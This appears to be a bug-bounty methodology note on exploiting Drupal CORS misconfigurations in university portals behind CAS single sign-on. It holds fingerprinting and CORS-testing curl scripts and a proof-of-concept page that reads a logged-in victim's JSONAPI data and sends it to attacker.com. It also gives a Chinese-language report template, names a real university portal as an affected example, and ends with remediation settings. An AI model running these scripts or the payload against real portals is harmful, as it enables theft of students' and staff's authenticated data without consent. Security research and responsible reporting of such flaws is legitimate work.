# Drupal CORS Misconfiguration Pattern (University Portals)

## Trigger
Target uses Drupal 7/8/9/10 with CAS SSO integration (common in Chinese universities). Portal subdomain (portal.*, ehall.*, my.*) redirects to CAS login.

## Fingerprint
```
# Drupal detection
curl -sk -D- "https://portal.TARGET/" | grep -i 'x-generator.*drupal'
curl -sk "https://portal.TARGET/core/CHANGELOG.txt"  # Drupal 8+
curl -sk "https://portal.TARGET/misc/drupal.js"       # Drupal 7
# CAS integration detection
curl -sk -D- "https://portal.TARGET/" | grep -i 'location.*caslogin\|location.*authserver\|location.*cas'
```

## CORS Test
```bash
# Test all endpoints - Drupal CORS applies site-wide
for path in "/" "/user/login" "/caslogin" "/admin" "/jsonapi" "/node/1" "/user/1" "/core/CHANGELOG.txt"; do
  cors=$(curl -sk --max-time 6 -H "Origin: https://evil.com" -D- "https://portal.TARGET$path" 2>/dev/null | grep -i 'access-control')
  if [ -n "$cors" ]; then echo "=== $path ==="; echo "$cors"; fi
done
```

## Vulnerability Pattern
Drupal's `cors.config` in `services.yml` or settings.php can be misconfigured:
```yaml
# VULNERABLE: reflects any origin with credentials
cors.config:
  enabled: true
  allowedHeaders: ['*']
  allowedMethods: ['*']
  allowedOrigins: ['*']
  supportsCredentials: true
```

When `allowedOrigins: ['*']` + `supportsCredentials: true`, Drupal reflects the request's Origin header in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. This allows any website to make authenticated cross-origin requests and read responses.

### Key behavior
- Drupal does NOT return `Access-Control-Allow-Origin: *` (browsers reject this with credentials)
- Instead, it mirrors the `Origin` request header value back as `Access-Control-Allow-Origin`
- This means ANY origin gets reflected, not just a fixed list
- The CORS applies to ALL endpoints: /admin, /jsonapi, /node/*, /user/*, etc.

## Exploitation PoC
```html
<!-- Attacker-hosted page -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://portal.TARGET/jsonapi/node/article", true);
xhr.withCredentials = true;  // sends CAS session cookie
xhr.onload = function() {
  // Can read the response - user data exfiltrated
  fetch("https://attacker.com/collect?data=" + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>
```

## Impact Assessment
- **Authenticated data exfiltration**: If victim has active CAS session, attacker reads portal data
- **Drupal JSONAPI**: /jsonapi endpoint exposes content entities (users, nodes, taxonomy) as JSON
- **CAS SSO amplification**: Portal session often grants access to multiple university systems
- **Admin endpoints**: /admin path accessible cross-origin if admin user visits attacker page

## False Positive Check
- Confirm CORS headers appear on multiple endpoints (not just one cached response)
- Verify the Origin is actually reflected (not a static whitelist that happens to include your test origin)
- Test with a random Origin like `https://random-$(date +%s).com` to confirm dynamic reflection
- Check if `Access-Control-Allow-Credentials: true` is present (without this, the finding is low/informational)

## Report Template
```
标题: [大学名称]信息门户portal.[domain]存在CORS配置错误，可导致认证用户数据跨域窃取
域名: portal.[domain]
类型: CORS配置错误
等级: 中危

详情: portal.[domain]为[大学]信息门户，基于Drupal [版本]构建，通过CAS统一身份认证保护。
系统所有端点的CORS配置反射任意Origin请求头，并设置Access-Control-Allow-Credentials: true。

复现:
curl -sk -H "Origin: https://evil.com" -D- "https://portal.[domain]/"

响应: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true

影响: 攻击者构造恶意页面诱导已登录CAS的师生访问后，通过XHR跨域读取portal认证响应，
可泄露用户信息、新闻内容、系统配置。结合Drupal JSONAPI可批量导出数据。
```

## Real-World Example
cumt.edu.cn (中国矿业大学, 2026-06): Drupal 10 + PHP/8.1.6, portal.cumt.edu.cn全站CORS反射。
CAS加固良好(3次锁定+验证码+FIDO)，但portal CORS可绕过CAS保护读取认证数据。

## Remediation
```yaml
# services.yml - secure CORS config
cors.config:
  enabled: true
  allowedHeaders: ['Authorization', 'Content-Type']
  allowedMethods: ['GET', 'POST']
  allowedOrigins:
    - 'https://portal.TARGET'
    - 'https://*.TARGET'  # if needed
  supportsCredentials: true
  maxAge: 86400
```
